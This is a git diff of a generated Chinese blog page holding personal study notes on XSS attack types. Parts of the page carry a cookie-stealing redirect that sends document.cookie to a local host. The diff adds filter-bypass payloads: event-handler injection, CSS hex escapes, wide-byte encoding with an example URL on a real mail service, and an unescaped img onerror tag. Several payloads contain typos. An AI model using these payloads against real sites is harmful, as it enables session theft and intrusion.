@@ -111,7 +111,8 @@ window.location.href = &amp;apos;http://127.0.0.1/index.php?cookie=&amp;apos;+co
 var cookie = document.cookie
 window.location.href = &amp;apos;http://127.0.0.1/index.php?cookie=&amp;apos;+cookie;
 使用document对象里面的cookie属性去获得浏览器里的cookie值使用win">
-<meta property="og:updated_time" content="2017-02-15T07:18:29.528Z">
+<meta property="og:image" content="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/1">
+<meta property="og:updated_time" content="2017-03-30T06:03:02.583Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss攻击类型和方式">
 <meta name="twitter:description" content="&amp;gt; 攻击：
@@ -124,6 +125,7 @@ window.location.href = &amp;apos;http://127.0.0.1/index.php?cookie=&amp;apos;+co
 var cookie = document.cookie
 window.location.href = &amp;apos;http://127.0.0.1/index.php?cookie=&amp;apos;+cookie;
 使用document对象里面的cookie属性去获得浏览器里的cookie值使用win">
+<meta name="twitter:image" content="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/1">
 
 
 
@@ -361,7 +363,7 @@ window.location.href = &amp;apos;http://127.0.0.1/index.php?cookie=&amp;apos;+co
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-15T13:30:40+08:00">
+              <time title="Дата создания записи" itemprop="dateCreated datePublished" datetime="2017-02-15T13:30:40+08:00">
                 2017-02-15
               </time>
             
@@ -453,6 +455,36 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
 <p>如何注入代码到页面中（xss之后台注入）</p>
 <p>当别人打开自己的后台界面的时候（自己提交的数据只有自己能看得到，也就是并不是一个公共的平台）若往后台界面注入JS代码那么被注入的也是自己，所以此时要使用反射性xss攻击。</p>
 </blockquote>
+<p> -<br> -<br> -<br> -</p>
+<p> -<br>    <strong>xss攻击的几种方式</strong></p>
+<p>-<br>1.基本上没有过滤符号（’&lt;’ ‘&gt;’）</p>
+<blockquote>
+<p>在url栏上输入，打开html的源代码，如果能看到在url上的输入，即也能看到输出<br>即输入输出都没有过滤<br><img src="1" onerror="alter(1);"> →插入代码</p>
+</blockquote>
+<p>2.输出在<script></script>之间的情况</p>
+<blockquote>
+<p>特点：1.仍然是输入输出均可见，即都没有过滤<br>     2.输出在源代码中在<script></script>中间</p>
+</blockquote>
+<p>-</p>
+<blockquote>
+<p>解法：<br>1.判断是否过滤符号&lt; &gt; /等<br>若没有过滤，直接构造‘输入’源代码→ script&gt;alert(1)<br>如果经过过滤：<br>1.1 通过JS构造 → eval（’alter(1)’）;void</p>
+</blockquote>
+<p>3.输出在HTML属性里的情况</p>
+<blockquote>
+<p>案例一：<br><code>&lt;input value=&quot;输出&quot;&gt; 、 &lt;img onload=&quot;...[输出]...&quot;&gt; ，再比如 &lt;body style=&quot;...[输出]...&quot;&gt;</code><br><code>&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; onclick=&quot;alert(1)&quot; /&gt;</code><br>输入的是   乌云欢迎您” onclick=”alter(1)   前一个”与value=””的前双引号闭合，后一个与其后一个双引号闭合。<br>但通常情况下会浏览器会过滤掉w我们输入的””号，过滤为#quot;<br>但如果没有过滤’\’，同样可以过滤<br>css中允许转义字符 +ascii 16 进制形式<br>例如过滤了expression 可以用expr\65ssion绕过<br><code>e 的 ascii 16 进制是 65, 我们就写为 \65 expression -&gt; expr\65ssion。</code></p>
+<p>案例二：<br><code>&lt;HTML 标签 onXXXX=&quot;...[输出在这里]..&quot;&gt; 
+&lt;a href=&quot;javascript:[输出在这里]&quot;&gt;xxxx &lt;/a&gt;</code><br>常规来说，因为 onxxxx=”[输出]” 和 href=”javascript:[输出]” 与 <script>[输出]</script> 没有太大区别。因为[输出]所在的地方，都是 javascript 脚本。<br>但是<script>[输出]</script> 如果被过滤，往往没有太好的办法。 而上面这 2 种情况，则有一个很好的办法绕过过滤。只要上面的情况，没有过滤 &amp;，# 等符号，我们就可以写入任意字符</p>
+</blockquote>
+<p>-</p>
+<p>4.宽字节复仇记</p>
+<blockquote>
+<p>通过注入”来闭合前面的双引号<br>一般情况下，”会被过滤为&quot;<br>如果是gbxxx系列的编码，则可以尝试一下宽字节<br><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt;</code><br>“ 转移为%22<br><code>http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa</code></p>
+</blockquote>
+<p>5.使用反斜线过滤</p>
+<blockquote>
+<p>一般情况下，双引号会被过滤，但有时候\还可以使用<br>使用//来注释掉后面的内容（即//后面的都被当成是注释）<br>/**/可以代替空格</p>
+</blockquote>
+<p>6.使用换行符，（在备注中）→ %0a</p>
 
       
     </div>
@@ -576,7 +608,7 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
